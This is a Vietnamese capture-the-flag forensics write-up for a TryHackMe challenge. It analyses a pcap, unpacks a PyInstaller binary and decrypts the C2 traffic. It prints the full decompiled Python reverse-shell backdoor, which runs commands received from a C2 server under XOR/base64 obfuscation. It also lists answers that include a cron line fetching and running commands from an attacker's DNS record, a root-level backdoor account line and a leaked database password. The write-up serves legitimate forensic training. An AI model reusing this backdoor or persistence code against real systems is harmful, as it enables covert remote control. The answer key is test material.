---
title: "SeeTwoTHM"
excerpt_separator: "<!--more-->"
categories:
  - SeeTwoTHM
tags:
  - Writeup
  - Forensics
---

> [!INFO] Thông tin bài thi
> **Chủ đề:** Phân tích lưu lượng mạng và Dịch ngược Mã độc Python (C2 Traffic Decryption)
> **Mục tiêu:** Phân tích file capture.pcap, xác định hoạt động đáng ngờ, dịch ngược mã độc và giải mã nội dung giao tiếp giữa nạn nhân (victim) và máy chủ điều khiển (C2 Server)
---

## Mô tả thử thách
 
> You are tasked with looking at some suspicious network activity by your digital forensics team.
The server has been taken out of production while you analyze the suspicious behavior.

## Phân tích 

Sau khi nhận file pcap, tôi bắt đầu phân tích lưu lượng mạng. Bằng việc lọc các gói tin TCP, tôi phát hiện những đoạn dữ liệu mã hóa đáng ngờ và một tập tin đã được truyền tải thông qua giao thức HTTP.

Stream 2:
```
GET /base64_client HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.0.2.64
Connection: Keep-Alive


HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.11.4
Date: Fri, 27 Oct 2023 03:06:00 GMT
Content-type: application/octet-stream
Content-Length: 16181879
Last-Modified: Fri, 27 Oct 2023 03:05:03 GMT

f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAdSVAAAAAAABAAAAAAAAAACjBtgAAAAAAAAAAAEAAOAAL
AEAAHAAbAAYAAAAEAAAAQAAAAAAAAABAAEAAAAAAAEAAQAAAAAAAaA.....
```
Tiếp tục tăng số stream tôi phát hiện thấy một lượng lớn đoạn mã hóa có khả năng là base64

Stream 3:
```
iVBORw0KGgoAAAANSUhEUgAAAU4AAAGFCAYAAACSfBoeAAAIUklEQVR42u3dO64qSxBE0Z45JjNEYgaYzICPh4dTyo7MWiFtP8.......
```
Stream 4:
```
iVBORw0KGgoAAAANSUhEUgAAAVwAAAFcBAMAAAB2OBsfAAAAKlBMVEXu7u7///8BAAD1Qzaenp7+TD40IyKvr6/Yz85fX1/pMiSZKSGIiIj5gnm5oY/.....
```

Tiếp theo tôi lọc filter giao thức HTTP để phân tích các gói tin HTTP và nhận được kết quả như sau:

![Các gói tin HTTP](/assets/images/http.png)

Qua việc phân tích các gói tin HTTP và trước đó, tôi phát hiện có 1 file được truyền tải và tôi đã tải file này về để phân tích tiếp bằng cách sử dụng 
``` 
file --> export objects --> save all
```
Sau khi tải về tôi được một file có tên là `base64_client`. Tôi sử dụng lệnh `file base64_client` để kiểm tra loại file và nhận được kết quả:

![Loại file](/assets/images/file.png)

Sau đó tiến hành tôi sử dụng lệnh cat và nhận thấy đây là một file chứa một chuỗi văn bản khổng lồ có thể là đoạn mã hóa bằng base64:
![Nội dung file base64_client](/assets/images/cat.png)

Tôi tiến hành giải mã đoạn base64 này bằng lệnh:
```
base64 -d base64_client > decoded_file
```
Sau khi giải mã tôi nhận được một file có tên `decoded_file`. Tôi tiếp tục sử dụng lệnh `file decoded_file` để kiểm tra loại file và nhận được kết quả:

![Loại file decoded_file](/assets/images/file_decoded.png)

Từ kết quả trên tôi nhận thấy đây là một file thực thi ELF 64-bit. Tôi sử dụng lệnh `strings decoded_file | less` để xem các chuỗi ký tự trong file và nhận được nhiều chuỗi đáng chú ý như:

![Chuỗi trong decoded_file](/assets/images/strings.png)

Phân tích từ các chuỗi trên tôi nhận thấy đây là một mã độc được viết bằng Python và đã được đóng gói thành file thực thi ELF bằng PyInstaller. Tôi quyết định sử dụng công cụ `pyinstxtractor` để giải nén file này.

```
git clone https://github.com/extremecoders-re/pyinstxtractor
cd pyinstxtractor
python3 pyinstxtractor.py ../decoded_file
```
Sau khi giải nén tôi nhận được một thư mục `decoded_file_extracted` chứa nhiều file và thư mục con. 

![Toàn bộ file trong thư mục](/assets/images/ls.png)

Tới bước này có thể chúng ta sẽ phân vân không biết nên phân tích file nào. Tuy nhiên, dựa vào kinh nghiệm của tôi khi bạn nhìn vào list các file có thể thấy một file có tên `client.pyc` rất nổi bật vì nó có tên giống với tên file trong URL ban đầu `base64_client`. Tôi quyết định phân tích file này trước.  
Tôi sử dụng công cụ `uncompyle6` để dịch ngược file `client.pyc` về mã nguồn Python.    
```
python3 -m venv myenv
source myenv/bin/activate
pip install uncompyle6
uncompyle6 -o . client.pyc
```
Sau khi dịch ngược tôi nhận được file `client.py` chứa mã nguồn Python. Tôi mở file này và tiến hành phân tích mã nguồn.

```python
# uncompyle6 version 3.9.3
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.13.7 (main, Aug 20 2025, 22:17:40) [GCC 14.3.0]
# Embedded file name: client.py
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
        encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
        key = "MySup3rXoRKeYForCommandandControl".encode("utf-8")
        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
        decrypted_command = decrypted_command.decode("utf-8")
        result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
        encrypted_result = xor_crypt(result.encode("utf-8"), key)
        encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
        separator = "AAAAAAAAAA"
        send = encoded_image + separator + encrypted_result_base64
        s.sendall(send.encode("utf-8"))
                                                                      
```
Qua phân tích mã nguồn, có thể xác định đây là một mã độc dạng Backdoor, thiết lập kết nối Reverse Shell qua giao thức TCP để nhận lệnh từ máy chủ điều khiển (C2).

1. Thông tin 
- C2 Server: Mã độc chủ động kết nối tới địa chỉ IP 10.0.2.64.
- Port: Cổng dịch vụ là 1337.
- Khóa giải mã (Key): Một khóa cứng (hardcoded key) được tìm thấy trong mã nguồn là: "MySup3rXoRKeYForCommandandControl".

2. Cơ chế Mã hóa và Làm rối 
- Để tránh bị phát hiện bởi các hệ thống giám sát mạng (IDS/IPS), mã độc không gửi lệnh dưới dạng văn bản rõ (plaintext) mà sử dụng thuật toán XOR kết hợp với Base64:
- Thuật toán XOR: Sử dụng tính chất đối xứng của phép toán XOR (A ^ Key = B và B ^ Key = A) để dùng chung một hàm cho cả việc mã hóa và giải mã.
- Cơ chế Key Cycling: Sử dụng kỹ thuật vòng lặp khóa (key[i % key_length]). Nếu dữ liệu dài hơn độ dài của khóa, khóa sẽ tự động lặp lại từ đầu để đảm bảo mọi byte dữ liệu đều được xử lý.

3. Kỹ thuật Che giấu Giao tiếp 
Mã độc sử dụng kỹ thuật ngụy trang gói tin để đánh lừa các nhà phân tích:

- Mỗi gói tin trao đổi luôn bao gồm hai phần, được ngăn cách bởi chuỗi ký tự đặc biệt: AAAAAAAAAA.
- Phần đầu: Chứa dữ liệu rác hoặc mã Base64 của một file ảnh (nhằm giả mạo lưu lượng tải ảnh thông thường).
- Phần sau: Chứa Payload (lệnh hoặc kết quả) đã được mã hóa.

4. Quy trình Xử lý Dữ liệu 
Quá trình giao tiếp giữa máy nạn nhân và C2 diễn ra theo hai chiều như sau:

> A. Chiều Nhận lệnh (Inbound):

- Phân tách: Mã độc nhận gói tin và tách lấy phần payload nằm sau chuỗi phân cách AAAAAAAAAA.

Giải mã:

- Base64 Decode: Chuyển chuỗi ký tự về định dạng nhị phân (binary).

- XOR Decrypt: Kết hợp với khóa cứng để giải mã ra câu lệnh gốc.

- Thực thi: Sử dụng hàm subprocess.check_output với tham số shell=True để chạy câu lệnh vừa giải mã trực tiếp trên hệ thống nạn nhân với quyền hạn hiện tại.

> B. Chiều Gửi kết quả (Outbound): Ngược lại với quy trình nhận, kết quả sau khi thực thi lệnh sẽ được xử lý để gửi trả về C2:

Mã hóa:

- XOR Encrypt: Mã hóa kết quả thực thi (dạng text) bằng thuật toán XOR.

- Base64 Encode: Chuyển dữ liệu đã mã hóa sang dạng chuỗi Base64 để thuận tiện truyền tải.

- Đóng gói (Re-packaging): Ghép chuỗi kết quả này vào sau dữ liệu ảnh giả mạo và chuỗi phân cách AAAAAAAAAA. Điều này giúp duy trì vỏ bọc ngụy trang nhất quán trong cả hai chiều giao tiếp.

Sau khi phân tích kỹ mã nguồn, tôi đã nhờ AI tạo một script để giải mã chuỗi văn bản khổng lồ đã tìm thấy trong file pcap ban đầu. Dưới đây là script Python mà tôi đã sử dụng:

```python
import base64
import os

INPUT_PATH = r"D:\CTF\THM\evidence-1698376680956\dump.txt"
OUTPUT_PATH = INPUT_PATH.replace("dump.txt", "communicate.txt")

KEY = b"MySup3rXoRKeYForCommandandControl"
SEPARATOR = "AAAAAAAAAA"

def main():
    success_count = 0
    try:
        with open(INPUT_PATH, "r", encoding="utf-8", errors="ignore") as infile, \
             open(OUTPUT_PATH, "w", encoding="utf-8") as outfile:
            for line in infile:
                line = line.strip()
                if not line: continue
                try:  
                    if SEPARATOR in line:
                        encoded_data = line.split(SEPARATOR)[1]
                    else:
                        continue 
                    # 2. Base64 Decode
                    decoded_data = base64.b64decode(encoded_data)
                   
                    # 3. XOR Decrypt
                    decrypted = bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(decoded_data))                   
                    decrypted_text = decrypted.decode("utf-8", errors="ignore")
                    outfile.write(decrypted_text + "\n")
                    success_count += 1
                except (IndexError, base64.binascii.Error, ValueError):
                    continue
 
    except Exception as e:
        print(f"[-] Lỗi: {e}")

if __name__ == "__main__":
    main()
```
Sau khi chạy script trên, tôi nhận được một file `communicate.txt` chứa các lệnh đã được giải mã. Tôi mở file này và tìm thấy nhiều lệnh hệ thống đã được thực thi trên máy nạn nhân, tới đây chúng ta đã có đủ dữ liệu để có thể trả lời các câu hỏi của challenge.

![Nội dung file](/assets/images/communicate.png)

## Kết luận và Trả lời câu hỏi
1. **What is the first file that is read? Enter the full path of the file.**
    - Đáp án: ```/home/bella/.bash_history```
2. **What is the output of the file from question 1?**
    - Đáp án: ```mysql -u root -p'vb0xIkSGbcEKBEi'```
3. **What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.**
    - Đáp án: ```toor::0:0:root:/root:/bin/bash```
4. **What is the name of the backdoor executable?**
    - Đáp án: ```/usr/bin/passswd```
5. **What is the md5 hash value of the executable from question 4?**
    - Đáp án: ```23c415748ff840b296d0b93f98649dec```
6. **What was the first cronjob that was placed by the attacker?**
    - Đáp án: ```* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"```
7. **What is the flag?**
    - Đáp án: ```THM{See2sNev3rGetOld}```